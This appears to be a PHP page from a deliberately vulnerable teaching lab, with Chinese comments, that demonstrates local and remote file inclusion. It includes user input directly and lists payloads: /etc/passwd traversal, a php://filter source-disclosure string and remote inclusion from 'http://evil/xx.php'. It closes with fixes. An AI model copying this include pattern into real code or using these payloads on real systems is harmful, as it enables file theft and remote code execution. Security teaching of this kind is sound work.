<?php require_once __DIR__ . '/../../core/init.php'; ?>
<?php
// 演示：未做白名单的文件包含，可 LFI / RFI
$page = $_GET['page'] ?? 'home';
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>文件包含 LFI/RFI</title>
  <link rel="stylesheet" href="/assets/css/style.css" />
</head>
<body>
  <header class="nav"><div class="brand">文件包含</div><div class="links"><a href="/">返回首页</a></div></header>
  <main class="container module">
    <div class="panel">
      <form method="get">
        <div class="field"><label>包含的页面（不安全）</label><input name="page" placeholder="例如：home | about | ../../data/notes.txt | http://example.com/" value="<?php echo h($page); ?>"/></div>
        <button class="btn btn-primary" type="submit">包含</button>
      </form>
    </div>
    <div class="panel">
      <h3>输出：</h3>
      <div style="background:#0e1319;padding:12px;border-radius:8px;white-space:pre-wrap;">
        <?php
        // 演示：RFI 需 allow_url_include=On（在现代PHP默认关闭），否则此处只能 LFI。
        // 直接拼接，存在路径遍历与远程包含风险
        $path = $page;
        if (strpos($path, '://') !== false) {
            @include $path;
        } else {
            @include __DIR__ . '/../../pages/' . $path . '.php';
        }
        ?>
      </div>
    </div>
    <div class="panel explain">
      <h3>原理解析</h3>
      <p>文件包含漏洞源于将用户可控的标识拼接到包含路径，导致本地文件读取（LFI）或远程文件包含（RFI）。</p>
      <h3>常见利用方式</h3>
      <ul>
        <li>路径遍历读取：<code>../../etc/passwd</code>、<code>..\\..\\Windows\\win.ini</code>。</li>
        <li>源码查看：<code>php://filter/convert.base64-encode/resource=index.php</code>。</li>
        <li>远程包含：<code>http://evil/xx.php</code>（现代 PHP 默认禁止 <code>allow_url_include</code>）。</li>
      </ul>
      <h3>常见绕过与修复</h3>
      <ul>
        <li>修复：白名单 + 固定映射，不直接拼接用户输入到文件路径。</li>
        <li>修复：禁用危险包装器（如 <code>php://</code>）并归一化路径后校验。</li>
        <li>修复：隔离模板与数据目录，最小权限原则。</li>
      </ul>
    </div>
  </main>
</body>
</html>